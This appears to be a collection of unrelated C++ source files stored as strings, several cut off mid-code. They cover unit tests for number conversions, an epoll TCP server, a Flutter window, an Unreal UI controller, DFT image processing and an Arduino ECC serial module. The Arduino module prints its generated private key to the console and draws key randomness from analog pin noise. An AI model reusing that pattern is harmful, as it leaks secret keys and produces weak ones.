    "#include <string>\n#include <complex>\n\n#include <gtest/gtest.h>\n#include \"TypeManipulation.h\"\n\n// int convertDigitChar2Int(char digit_char);\nTEST(TypeManipulationTest, convertDigitChar2IntTest_ValidInputs) {\n\n    EXPECT_EQ(convertDigitChar2Int('0'), 0) << \"Test failed for '0'\";\n    EXPECT_EQ(convertDigitChar2Int('2'), 2) << \"Test failed for '2'\";\n    EXPECT_EQ(convertDigitChar2Int('9'), 9) << \"Test failed for '9'\";\n}\nTEST(TypeManipulationTest, convertDigitChar2IntTest2_InvalidInputs) {\n\n    EXPECT_THROW(convertDigitChar2Int('-'), std::invalid_argument) << \"Test failed for '-'\";\n    EXPECT_THROW(convertDigitChar2Int('.'), std::invalid_argument) << \"Test failed for '.'\";\n    EXPECT_THROW(convertDigitChar2Int('e'), std::invalid_argument) << \"Test failed for 'e'\";\n}\n\n// char convertDigitInt2Char(int digit_int);\nTEST(TypeManipulationTest, convertDigitInt2Char_ValidInputs) {\n\n    EXPECT_EQ(convertDigitInt2Char(1), '1') << \"Test failed for 1\" ;\n    EXPECT_EQ(convertDigitInt2Char(2), '2') << \"Test failed for 2\";\n    EXPECT_EQ(convertDigitInt2Char(9), '9') << \"Test failed for 9\";\n}\nTEST(TypeManipulationTest, convertDigitInt2Char_InvalidInputs) {\n\n    EXPECT_THROW(convertDigitInt2Char(-1), std::invalid_argument) << \"Test failed for -1\";\n    EXPECT_THROW(convertDigitInt2Char(12), std::invalid_argument) << \"Test failed for 12\";\n    EXPECT_THROW(convertDigitInt2Char(100), std::invalid_argument) << \"Test failed for 100\";\n}\n\n// std::vector<int> convertNumStr2Vec(const std::string& num)\nTEST(TypeManipulationTest, convertNumStr2Vec_ValidInputs) {\n\n    std::vector<int> expected_output1 = {};\n    EXPECT_EQ(convertNumStr2Vec(\"\"), expected_output1);\n\n    std::vector<int> expected_output2 = {5};\n    EXPECT_EQ(convertNumStr2Vec(\"5\"), expected_output2);\n\n    std::vector<int> expected_output3 = {1, 2, 3, 4, 5};\n    EXPECT_EQ(convertNumStr2Vec(\"54321\"), expected_output3);\n}\nTEST(TypeManipulationTest, convertNumStr2Vec_InvalidInputs) {\n\n    EXPECT_THROW(convertNumStr2Vec(\"-123.5\"), std::invalid_argument);\n    EXPECT_THROW(convertNumStr2Vec(\"1e10\"), std::invalid_argument);\n    EXPECT_THROW(convertNumStr2Vec(\"22/7\"), std::invalid_argument);\n}\n\n\n// std::string convertNumVecr2Str(std::vector<int> num_vec)\nTEST(TypeManipulationTest, convertNumVecr2Str_ValidInputs) {\n\n    std::vector<int> input1 = {};\n    EXPECT_EQ(convertNumVec2Str(input1), \"\");\n\n    std::vector<int> input2 = {5};\n    EXPECT_EQ(convertNumVec2Str(input2), \"5\");\n\n    std::vector<int> input3 = {1,2,3,4,5};\n    EXPECT_EQ(convertNumVec2Str(input3), \"54321\");\n}\n\nTEST(TypeManipulationTest, convertNumVecr2Str_InvalidInputs) {\n\n    std::vector<int> input1 = {-1};\n    EXPECT_THROW(convertNumVec2Str(input1), std::invalid_argument);\n\n    std::vector<int> input3 = {26,7,-1};\n    EXPECT_THROW(convertNumVec2Str(input3), std::invalid_argument);\n}\n\n\n// std::vector<std::complex<double>> convertRealInt2ComplexDouble(std::vector<int>);\nTEST(TypeManipulationTest, convertRealVecInt2VecComplexDouble_ValidInputs) {\n\n    std::vector<std::complex<double>> expected_output1 = {std::complex<double>(1.0, 0.0)};\n    EXPECT_EQ(convertRealVecInt2VecComplexDouble({1}), expected_output1);\n\n    std::vector<std::complex<double>> expected_output2 = {std::complex<double>(1.0, 0.0),\n                                                          std::complex<double>(2.0, 0.0),\n                                                          std::complex<double>(5.0, 0)};\n    EXPECT_EQ(convertRealVecInt2VecComplexDouble({1, 2, 5}), expected_output2);\n}\nTEST(TypeManipulationTest, convertRealVecInt2VecComplexDouble_InvalidInputs) {\n\n   // Should be 0<=Digit<=9 \n    EXPECT_THROW(convertRealVecInt2VecComplexDouble({'h','i'}), std::invalid_argument);\n    EXPECT_THROW(convertRealVecInt2VecComplexDouble({-1}), std::invalid_argument);\n    EXPECT_THROW(convertRealVecInt2VecComplexDouble({0,356}), std::invalid_argument);\n}\n\n\n// std::vector<int> convertVecComplexDouble2RealVecInt(std::vector<std::complex<double>> num12_complex)\nTEST(TypeManipulationTest, convertVecComplexDouble2RealVecInt_ValidInputs) {\n\n    std::vector<std::complex<double>> input1 = {std::complex<double>(1.0, 1.0)};\n    EXPECT_EQ(convertVecComplexDouble2RealVecInt(input1), (std::vector<int>{1}));\n\n    std::vector<std::complex<double>> input2 = {std::complex<double>(5.65, 0.1),\n                                                          std::complex<double>(25.0, 0.3),\n                                                          std::complex<double>(1.0, 0)};\n    EXPECT_EQ(convertVecComplexDouble2RealVecInt(input2), (std::vector<int>{6, 25, 1}));\n}\nTEST(TypeManipulationTest, convertVecComplexDouble2RealVecInt_InvalidInputs) {\n\n    std::vector<std::complex<double>> input1 = {std::complex<double>(-1.0, 1.2)};\n    EXPECT_THROW(convertVecComplexDouble2RealVecInt(input1), std::invalid_argument);    \n}\n\n\n// std::string removePrecedingZeros(const std::string& num_orignal)\nTEST(TypeManipulationTest, removePrecedingZerosString_ValidInputs) {\n\n    EXPECT_EQ(removePrecedingZeros(\"00000",
    "#include \"TcpServer.h\"\n\nTcpServer::TcpServer(const std::string& ip, const std::string& port, int threadNum, int timeval, int timeout, uint16_t sep)\n:threadnum_(threadNum), mainloop_(new EventLoop(true, timeval, timeout)), \nacceptor_(mainloop_.get(), ip, port), threadpool_(threadnum_, \"I/O\"), sep_(sep)\n{\n    mainloop_->setepollTimeoutCallback(std::bind(&TcpServer::epollTimeout, this, std::placeholders::_1));\n\n    acceptor_.setNewConnectionCB(std::bind(&TcpServer::newConnection, this, std::placeholders::_1));\n\n    for(int i = 0; i < threadnum_; i++){\n        subloops_.emplace_back(new EventLoop(false, timeval, timeout));//\u76f4\u63a5\u5728vector\u4e2d\u6784\u9020\uff0c\u907f\u514d\u4e86\u62f7\u8d1d\n        subloops_[i]->setepollTimeoutCallback(std::bind(&TcpServer::epollTimeout, this, std::placeholders::_1));\n        threadpool_.addtask(std::bind(&EventLoop::run, subloops_[i].get()));\n    }\n}\n\nTcpServer::~TcpServer(){\n\n}\n\nvoid TcpServer::start(){\n    mainloop_->run();\n}\n\nvoid TcpServer::stop(){\n    //\u505c\u6b62\u4e3b\u4e8b\u4ef6\u5faa\u73af\n    mainloop_->stop();\n    //\u505c\u6b62\u4ece\u4e8b\u4ef6\u5faa\u73af\n    for(auto &loop : subloops_)\n        loop->stop();\n    //\u7ec8\u6b62\u4ece\u4e8b\u4ef6\u5faa\u73af\u7ebf\u7a0b\n    threadpool_.stop();\n}\n\nvoid TcpServer::newConnection(std::unique_ptr<Socket> clientsock){//\u76d1\u542csock\u4e0a\u6709\u65b0\u8fde\u63a5\n    //Connection* p = new Connection(mainloop_, clientsock);\n    //\u5c06\u8fde\u63a5\u540e\u7684sock\u5206\u914d\u7ed9\u4ece\u4e8b\u4ef6\u5faa\u73af\u53bb\u76d1\u542c\n    int fd = clientsock->getFd();\n    spConnection p(new Connection(subloops_[fd % threadnum_].get(), std::move(clientsock), sep_));\n    {//\u52a0\u9501\u518d\u5f80map\u4e2d\u6dfb\u52a0\u6570\u636e\n        std::lock_guard<std::mutex> lock(mutex_);\n        conns_[fd] = p;//\u6dfb\u52a0\u5230server\u7684map\u5bb9\u5668\u4e2d\n    }\n    subloops_[fd % threadnum_]->newConnection(p);//\u6dfb\u52a0\u5230Evevtloop\u7684map\u5bb9\u5668\u4e2d\n    p->setClosecallback(std::bind(&TcpServer::closeconnection, this, std::placeholders::_1));\n    p->seterrorCallback(std::bind(&TcpServer::errorconnection, this, std::placeholders::_1));\n    p->setMessageCallback(std::bind(&TcpServer::HandleMessage, this, std::placeholders::_1, std::placeholders::_2));\n    p->setsendfinshCallback(std::bind(&TcpServer::sendFinish, this, std::placeholders::_1));\n\n    if(newConnectionCB_)//\u521b\u5efa\u8fde\u63a5\u540e\u56de\u8c03\n        newConnectionCB_(p);\n}\n\nvoid TcpServer::closeconnection(spConnection conn){\n    if(closeconnectionCB_)//\u5173\u95ed\u8fde\u63a5\u524d\u56de\u8c03\n        closeconnectionCB_(conn);\n    {//\u52a0\u9501\u518d\u5220\u9664\u6570\u636e\n        std::lock_guard<std::mutex> lock(mutex_);\n        conns_.erase(conn->getFd());\n    }\n}\n    \nvoid TcpServer::errorconnection(spConnection conn){\n    if(closeconnectionCB_)//\u5173\u95ed\u8fde\u63a5\u524d\u56de\u8c03\n        closeconnectionCB_(conn);\n    {//\u52a0\u9501\u518d\u5220\u9664\u6570\u636e\n        std::lock_guard<std::mutex> lock(mutex_);\n        conns_.erase(conn->getFd());\n    }\n}\n\nvoid TcpServer::HandleMessage(spConnection conn, std::string& message){//message\u4e2d\u5b58\u50a8\u7740\u4e00\u4e2atcp\u6570\u636e\u5305\u4e2d\u7684\u6570\u636e\n    if(HandleMessageCB_)\n        HandleMessageCB_(conn, message);\n}\n\nvoid TcpServer::sendFinish(spConnection conn){\n    if(sendFinishCB_)\n        sendFinishCB_(conn);\n}\n\n void TcpServer::epollTimeout(EventLoop* loop){\n    if(epollTimeoutCB_)\n        epollTimeoutCB_(loop);\n }\n\nvoid TcpServer::setnewConnectionCB(std::function<void(spConnection)> fn){\n    newConnectionCB_ = fn;\n}\n\nvoid TcpServer::setcloseconnectionCB(std::function<void(spConnection)> fn){\n    closeconnectionCB_ = fn;\n}\n\nvoid TcpServer::seterrorconnectionCB(std::function<void(spConnection)> fn){\n    errorconnectionCB_ = fn;\n}\n\nvoid TcpServer::setHandleMessageCB(std::function<void(spConnection, std::string&)> fn){\n    HandleMessageCB_ = fn;\n}\n\nvoid TcpServer::setsendFinishCB(std::function<void(spConnection)> fn){\n    sendFinishCB_ = fn;\n}\n\nvoid TcpServer::setepollTimeoutCB(std::function<void(EventLoop*)> fn){\n    epollTimeoutCB_ = fn;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// Copyright INVI1998\n\n\n#include \"UI/WidgetController/OverlayWidgetController.h\"\n\n#include \"AttributeSet.h\"\n#include \"AbilitySystem/AuraAbilitySystemComponent.h\"\n#include \"AbilitySystem/AuraAttributeSet.h\"\n#include \"AbilitySystem/Data/AbilityInfo.h\"\n#include \"AbilitySystem/Data/LevelUpInfo.h\"\n#include \"Fonts/UnicodeBlockRange.h\"\n#include \"Kismet/KismetSystemLibrary.h\"\n#include \"Player/AuraPlayerState.h\"\n\n\nvoid UOverlayWidgetController::BroadcastInitialValues()\n{\n\tOnHealthChanged.Broadcast(GetAuraAS()->GetHealth());\t\t\t// \u5e7f\u64ad\u751f\u547d\u503c\u6539\u53d8\n\tOnMaxHealthChanged.Broadcast(GetAuraAS()->GetMaxHealth());\t\t// \u5e7f\u64ad\u6700\u5927\u751f\u547d\u503c\u6539\u53d8\n\tOnManaChanged.Broadcast(GetAuraAS()->GetMana());\t\t\t\t// \u5e7f\u64ad\u6cd5\u529b\u503c\u6539\u53d8\n\tOnMaxManaChanged.Broadcast(GetAuraAS()->GetMaxMana());\t\t\t// \u5e7f\u64ad\u6700\u5927\u6cd5\u529b\u503c\u6539\u53d8\n}\n\nvoid UOverlayWidgetController::BindCallbacksToDependencies()\n{\n\tGetAuraPS()->OnExpChangedDelegate.AddUObject(this, &UOverlayWidgetController::OnExpChanged);\t// \u6dfb\u52a0\u7ecf\u9a8c\u6539\u53d8\u7684\u59d4\u6258\n\tGetAuraPS()->OnLevelChangedDelegate.AddUObject(this, &UOverlayWidgetController::OnPlayerLevelChanged);\t// \u6dfb\u52a0\u7b49\u7ea7\u6539\u53d8\u7684\u59d4\u6258\n\tGetAuraPS()->OnAttributePointChangedDelegate.AddUObject(this, &UOverlayWidgetController::OnAttributePointsChanged);\t// \u6dfb\u52a0\u5c5e\u6027\u70b9\u6539\u53d8\u7684\u59d4\u6258\n\tGetAuraPS()->OnSkillPointChangedDelegate.AddUObject(this, &UOverlayWidgetController::OnSkillPointsChanged);\t// \u6dfb\u52a0\u6280\u80fd\u70b9\u6539\u53d8\u7684\u59d4\u6258\n\n\tGetAuraASC()->GetGameplayAttributeValueChangeDelegate(GetAuraAS()->GetHealthAttribute()).AddLambda( \n\t\t[this](const FOnAttributeChangeData& Data)->void\n\t\t{\n\t\t\tOnHealthChanged.Broadcast(Data.NewValue);\t// \u5e7f\u64ad\u751f\u547d\u503c\u6539\u53d8\n\t\t});\t// \u6dfb\u52a0\u751f\u547d\u503c\u6539\u53d8\u7684\u59d4\u6258\n\n\tGetAuraASC()->GetGameplayAttributeValueChangeDelegate(GetAuraAS()->GetMaxHealthAttribute()).AddLambda(\n\t\t[this](const FOnAttributeChangeData& Data)->void\n\t\t{\n\t\t\tOnMaxHealthChanged.Broadcast(Data.NewValue);\t// \u5e7f\u64ad\u6700\u5927\u751f\u547d\u503c\u6539\u53d8\n\t\t});\t// \u6dfb\u52a0\u6700\u5927\u751f\u547d\u503c\u6539\u53d8\u7684\u59d4\u6258)\n\n\tGetAuraASC()->GetGameplayAttributeValueChangeDelegate(GetAuraAS()->GetManaAttribute()).AddLambda(\n\t\t[this](const FOnAttributeChangeData& Data)->void\n\t\t{\n\t\t\tOnManaChanged.Broadcast(Data.NewValue);\t// \u5e7f\u64ad\u6cd5\u529b\u503c\u6539\u53d8\n\t\t});\t// \u6dfb\u52a0\u6cd5\u529b\u503c\u6539\u53d8\u7684\u59d4\u6258)\n\n\tGetAuraASC()->GetGameplayAttributeValueChangeDelegate(GetAuraAS()->GetMaxManaAttribute()).AddLambda(\n\t\t[this](const FOnAttributeChangeData& Data)->void\n\t\t{\n\t\t\tOnMaxManaChanged.Broadcast(Data.NewValue);\t// \u5e7f\u64ad\u6700\u5927\u6cd5\u529b\u503c\u6539\u53d8\n\t\t});\t// \u6dfb\u52a0\u6700\u5927\u6cd5\u529b\u503c\u6539\u53d8\u7684\u59d4\u6258)\n\n\tif (GetAuraASC())\n\t{\n\t\tGetAuraASC()->EffectAssetTags.AddLambda(\n\t\t\t[this](const FGameplayTagContainer& AssertTags)\n\t\t\t{\n\t\t\t\tfor (const FGameplayTag& Tag : AssertTags)\n\t\t\t\t{\n\t\t\t\t\t// \u8fd9\u91cc\u6211\u4eec\u53ea\u8981MessageTag\n\t\t\t\t\tFGameplayTag MessageTag = FGameplayTag::RequestGameplayTag(FName(\"Message\"));\t// \u83b7\u53d6Message\n\t\t\t\t\tif (Tag.MatchesTag(MessageTag))\n\t\t\t\t\t{\n\t\t\t\t\t\t// UKismetSystemLibrary::PrintString(GEngine->GetWorld(), Tag.ToString(), true, true, FLinearColor::Green, 5.0f);\t// \u6253\u5370Tag\n\n\t\t\t\t\t\tconst FUIWidgetRow* WidgetRow = GetDataTableRowByTag<FUIWidgetRow>(MessageWidgetDataTable, Tag);\t// \u901a\u8fc7Tag\u83b7\u53d6\u6570\u636e\u8868\u884c\n\t\t\t\t\t\t// \u6211\u4eec\u5e0c\u671b\u901a\u8fc7Tag\u6765\u83b7\u53d6\u6570\u636e\u8868\u884c\uff0c\u7136\u540e\u4f7f\u7528\u8fd9\u4e9b\u6570\u636e\u6765\u66f4\u65b0UI\uff0c\u6bd4\u5982\u4f7f\u7528\u5b83\u91cc\u9762\u7684\u4e00\u4e9b\u8d44\u4ea7\u6765\u663e\u793a\u5185\u5bb9\n\n\t\t\t\t\t\tMessageWidgetRowDelegate.Broadcast(*WidgetRow);\t// \u5e7f\u64ad\u6d88\u606f\u5c0f\u90e8\u4ef6\u884c\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t);\n\n\t\t// \u6211\u4eec\u5fc5\u987b\u8003\u8651\u5230\u5728\u521d\u59cb\u5316\u65f6\uff0c\u6211\u4eec\u53ef\u80fd\u8fd8\u6ca1\u6709\u7ed9\u4e88\u80fd\u529b\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u7ed9\u4e88\u4e86\u80fd\u529b\n\t\tif (GetAuraASC()->bStartupAbilitiesGiven)\n\t\t{\n\t\t\t// \u5982\u679c\u5df2\u7ecf\u7ed9\u4e88\u4e86\u80fd\u529b\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528OnInitializedStartupAbilities\n\t\t\tBroadcastAbilityInfo();\t// \u5e7f\u64ad\u80fd\u529b\u4fe1\u606f\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// \u5982\u679c\u6ca1\u6709\u7ed9\u4e88\u80fd\u529b\uff0c\u6211\u4eec\u5c31\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a\u59d4\u6258\uff0c\u4ee5\u4fbf\u5728\u7ed9\u4e88\u80fd\u529b\u65f6\u8c03\u7528OnInitializedStartupAbilities\n\t\t\tGetAuraASC()->AbilitiesGivenDelegate.AddUObject(this, &UOverlayWidgetController::BroadcastAbilityInfo);\n\t\t}\n\t}\n\n}\n\nvoid UOverlayWidgetController::OnExpChanged(int32 NewExp)\n{\n\n\tcheckf(GetAuraPS()->LevelUpInfo, TEXT(\"LevelUpInfo is not set in AuraPlayerState\"));\t// \u68c0\u67e5LevelUpInfo\u662f\u5426\u4e3a\u7a7a\n\n\t// \u83b7\u53d6\u73a9\u5bb6\u7b49\u7ea7\n\tint32 PlayerLevel = GetAuraPS()->LevelUpInfo->GetLevelByExp(NewExp);\t// \u83b7\u53d6\u73a9\u5bb6\u7b49\u7ea7\n\tPlayerLevel = FMath::Clamp(PlayerLevel, 1, GetAuraPS()->LevelUpInfo->LevelUpInformation.Num());\t// \u9650\u5236\u73a9\u5bb6\u7b49\u7ea7\n\n\t// \u4f20\u5165\u7684\u662f\u73a9\u5bb6\u7684\u603b\u7ecf\u9a8c\uff0c\u6211\u4eec\u9700\u8981\u5f97\u5230\u5f53\u524d\u7b49\u7ea7\u7684\u7ecf\u9a8c\n\tconst int32 CurrentLevelExp = GetAuraPS()->LevelUpInfo->GetCurrentLevelTotalExp(PlayerLevel);\t// \u83b7\u53d6\u5f53\u524d\u7b49\u7ea7\u7684\u603b\u7ecf\u9a8c\n\n\tconst int32 NextLevelExp = GetAuraPS()->LevelUpInfo->GetLevelUpRequiredExp(PlayerLevel + 1);\t// \u83b7\u53d6\u4e0b\u4e00\u7ea7\u7684\u603b\u7ecf\u9a8c\n\n\tconst float ExpPercent = static_cast<float>(NewExp - CurrentLevelExp) / static_cast<float>(NextLevelExp);\t// \u8ba1\u7b97\u7ecf\u9a8c\u767e\u5206\u6bd4\n\n\tOnExpPercentChangedDelegate.Broadcast(ExpPercent);\t// \u5e7f\u64ad\u7ecf\u9a8c\u767e\u5206\u6bd4\n}\n\nvoid UOverlayWidgetController::OnPlayerLevelChanged(int32 NewLevel) const\n{\n\tOnLevelChangedDelegate.Broadcast(NewLevel);\t// \u5e7f\u64ad\u7b49\u7ea7\u6539\u53d8\n}\n\nvoid UOverlayWidgetController::OnAttributePointsChanged(int32 NewAttributePoints) const\n{\n\tOnAttributePointsChangedDelegate.Broadcast(NewAttributePoints);\t// \u5e7f\u64ad\u5c5e\u6027\u70b9\u6539\u53d8\n}\n\nvoid UOverlayWidgetController::OnSkillPointsChanged(int32 NewSkillPoints) const\n{\n\tOnSkillPointsChangedDelegate.Broadcast(NewSkillPoints);\t// \u5e7f\u64ad\u6280\u80fd\u70b9\u6539\u53d8\n}\n\n",
    "//\n// Created by MasaHiroSaber on 2023/12/5.\n//\n\n#include \"CalFunction.h\"\n\nvoid CalFunction::calHist(CImageDataset &imgIn, int band, vector<double> &hist)\n{\n    for (int row = 0; row < imgIn.m_ysize; row++)\n    {\n        for (int col = 0; col < imgIn.m_xsize; col++)\n        {\n            int index = band * imgIn.m_xsize * imgIn.m_ysize + row * imgIn.m_xsize + col;\n            int hisValue = UINT8(imgIn.m_data[index]);\n            hist[hisValue]++;\n        }\n    }\n}\n\nvoid CalFunction::calCumHist(vector<double> &hist, vector<double> &cumHist, int area, int LEVEL)\n{\n    cumHist[0] = hist[0] / area;\n    for (int i = 1; i < LEVEL - 1; i++)\n    {\n        cumHist[i] = cumHist[i - 1] + hist[i] / area;\n    }\n    cumHist[255] = 1;\n}\n\nvoid CalFunction::zeroFill(CImageDataset &imgIn, CImageDataset &Temp, int kerLen)\n{\n    int border = kerLen / 2;\n\n    const double *imgInput = imgIn.m_data;\n\n    CImageDataset Fill;\n    Fill.create(imgIn.m_xsize + 2 * border, imgIn.m_ysize + 2 * border, imgIn.m_rastercount);\n\n    //0\u586b\u5145\n    for (int band = 0; band < imgIn.m_rastercount; band++)\n    {\n        for (int row = border; row < Fill.m_ysize - border; row++)\n        {\n            for (int col = border; col < Fill.m_xsize - border; col++)\n            {\n                int indexTemp = band * Fill.m_ysize * Fill.m_xsize + row * Fill.m_xsize + col;\n                int indexIn = band * imgIn.m_ysize * imgIn.m_xsize + (row - border) * imgIn.m_xsize + (col - border);\n                Fill.m_data[indexTemp] = imgInput[indexIn];\n            }\n        }\n    }\n    Fill.duplicate(Temp);\n}\n\n\nvoid CalFunction::OneD_DFT(vector<complex<double>> &complexDFT, bool inverse)\n{\n    complex<double> Temp;\n    vector<complex<double>> complex_copy;\n    //vector<complex<double>> complex_copy;\n    size_t complexSize = complexDFT.size();\n    complex_copy.assign(complexDFT.begin(), complexDFT.end());\n\n    for (size_t k = 0; k < complexSize; k++)\n    {\n        Temp = 0;\n        for (size_t n = 0; n < complexSize; n++)\n        {\n            complex<double> calTemp(cos((2 * PI * k * n) / complexSize),\n                                    ((inverse ? 1 : -1) * sin((2 * PI * k * n) / complexSize)));\n            Temp += complex_copy[n] * calTemp;\n        }\n        complexDFT[k] = (inverse ? Temp / (double) complexSize : Temp);\n    }\n}\n\n\nvoid CalFunction::visualDFT(complex<double> *imgDFTdata, double *imgOutput, int doWhat, bool trans_option, int rows, int cols, int bands)\n{\n\n    double (*trans_fun)(const complex<double> &x);//\u5b9a\u4e49\u51fd\u6570\u6307\u9488\n    enum doWhat\n    {\n        FREQUENCY = 0, ANGLE = 1, ENERGY = 2\n    };\n    switch (doWhat)\n    {\n        case FREQUENCY://\u663e\u793a\u9891\u8c31\n        default:\n            trans_fun = CalFunction::amplitude;\n            break;\n        case ANGLE://\u663e\u793a\u76f8\u89d2\n            trans_fun = CalFunction::angle;\n            break;\n        case ENERGY://\u663e\u793a\u80fd\u91cf\n            trans_fun = CalFunction::energy;\n            break;\n    }\n\n    //\u53d6\u6a21\u7684\u540c\u65f6\u627e\u6700\u5927\u6a21\u548c\u6700\u5c0f\u6a21\n    for (int band = 0; band < bands; band++)\n    {\n        double max = 0;\n        double min = DBL_MAX;\n        for (int i = 0; i < rows * cols; i++)\n        {\n            int index = band * rows * cols + i;\n            imgOutput[index] = trans_fun(imgDFTdata[index]);//\u8f6c\u6362\u4e3a\u5e45\u5ea6\uff0c\u76f8\u89d2\uff0c\u6216\u8005\u529f\u7387\n\n            //\u8bb0\u5f55\u5f53\u524d\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\n            if (imgOutput[index] > max)\n                max = imgOutput[index];\n            if (imgOutput[index] < min)\n                min = imgOutput[index];\n        }\n\n        if (trans_option)\n        {\n            //\u5bf9\u6570\u53d8\u6362\n            double c = 255 / log(max + 1);\n            for (int i = 0; i < rows * cols; i++)\n            {\n                imgOutput[band * rows * cols + i] =\n                        c * log(imgOutput[band * rows * cols + i] + 1);\n            }\n        } else\n        {\n            //\u7ebf\u6027\u62c9\u4f38\n            double extr_diff = max - min;//\u6781\u5dee\n            for (int i = 0; i < rows * cols; i++)\n            {\n                imgOutput[band * rows * cols + i] =\n                        (imgOutput[band * rows * cols + i] - min) / (extr_diff * 255);\n            }\n        }\n    }\n}\n\ndouble CalFunction::amplitude(const complex<double> &x)\n{\n    return sqrt(pow(x.imag(), 2) + pow(x.real(), 2));\n}\n\ndouble CalFunction::angle(const complex<double> &x)\n{\n    return atan(x.imag() / x.real());\n}\n\ndouble CalFunction::energy(const complex<double> &x)\n{\n    return x.imag() * x.imag() + x.real() * x.real();\n}\n\n//void CalFunction::typeHPF(complex<double> *imgHPFdata, int rows, int cols, int bands, int type, double distance)\n//{\n//    double (*filter)(int row, int col, double cut, int rows, int cols);\n//    enum filter_type\n//    {\n//        IDEAL = 0, BUTTERWORTH = 1, GUASS = 2\n//    };\n//    switch (type)\n//    {\n//        case IDEAL://\u7406\u60f3\u9ad8\u901a\u6ee4\u6ce2\u5668\n//            filter = idealHPF;\n//            break;\n//        case BUTTERWORTH://butterworth\n//            filter = butterworthHPF;\n//            break;\n//        case GUASS://\u9ad8\u65af\n//            filter = gaussHPF;\n//            break;\n//    }\n//\n//    //\u505a\u70b9\u4e58\n//    for (int band = 0; band < ",
    "#include \"uECC.h\"\r\n#include \"secure_serial.h\"\r\n\r\nstatic int random_uECC(uint8_t *dest, unsigned size) {\r\n  while (size) {\r\n    uint8_t val = 0;\r\n    for (unsigned i = 0; i < 8; ++i) {\r\n        int init = analogRead(0);\r\n        int count = 0;\r\n        while (analogRead(0) == init) ++count;\r\n        if (!count) val = (val << 1) | (init & 0x01);\r\n        else val = (val << 1) | (count & 0x01);\r\n    }\r\n\r\n    *dest = val;\r\n    ++dest;\r\n    --size;\r\n  }\r\n\r\n  return 1;\r\n}\r\n\r\nvoid print_array(uint8_t* arr, int len) {\r\n    for (int i=0; i<len; ++i) {\r\n        Serial.print(arr[i]);\r\n        Serial.print(\",\");\r\n    }\r\n    Serial.println();\r\n}\r\n\r\nvoid secure_serial::begin(uint8_t rx, uint8_t tx, bool first_device) {\r\n    LOG_START\r\n    serial = new SoftwareSerial(rx, tx);\r\n    curve = uECC_secp256r1();\r\n    first = first_device;\r\n\r\n    pinMode(rx, INPUT);\r\n    pinMode(tx, OUTPUT);\r\n\r\n    serial->begin(115200);\r\n    while (!(*serial));\r\n\r\n    uECC_set_rng(&random_uECC);\r\n    uECC_make_key(public_key, private_key, curve);\r\n\r\n    print_array(public_key, key_size * 2);\r\n    print_array(private_key, key_size);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::recv_to_serial() {\r\n    LOG_START\r\n\r\n    while (serial->available()) {\r\n        Serial.write((char) serial->read());\r\n    }\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send(const char* msg) {\r\n    LOG_START\r\n    serial->print(msg);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::recv_line(char* dst, int maxlen) {\r\n    int l=0;\r\n    char ch = '\\0';\r\n    while (ch != '\\n' && l < maxlen) {\r\n        ch = serial->read();\r\n        dst[l++] = ch;\r\n    }\r\n}\r\n\r\nvoid secure_serial::send_from_serial() {\r\n    LOG_START\r\n    while (Serial.available())\r\n        serial->print((char) Serial.read());\r\n    recv_to_serial();\r\n    LOG_END\r\n}\r\n\r\nint secure_serial::available() {\r\n    return serial->available();\r\n}\r\n\r\nvoid secure_serial::recv_pub_key() {\r\n    LOG_START\r\n    send(CMDRECP);\r\n    WAIT(CMDRECA);\r\n\r\n    uint8_t recv_pub_key[key_size * 2];\r\n    uint8_t sz = serial->readBytes(recv_pub_key, key_size * 2);\r\n#ifdef DEBUG\r\n    Serial.print(\"[DEBUG] recv:\");\r\n    Serial.println(sz);\r\n#endif\r\n    uECC_shared_secret(recv_pub_key, private_key, shared_secret, curve);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send_hello() {\r\n    LOG_START\r\n    send(CMDHELLO1);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send_hello2() {\r\n    LOG_START\r\n    send(CMDHELLO2);\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send_pub_key() {\r\n    LOG_START\r\n    send(CMDRECA);\r\n    for (uint8_t i=0; i<key_size; ++i)\r\n        serial->write(public_key[i]);\r\n    if (!first) send(CMDRECP);\r\n    LOG_END\r\n}\r\n\r\nvoid 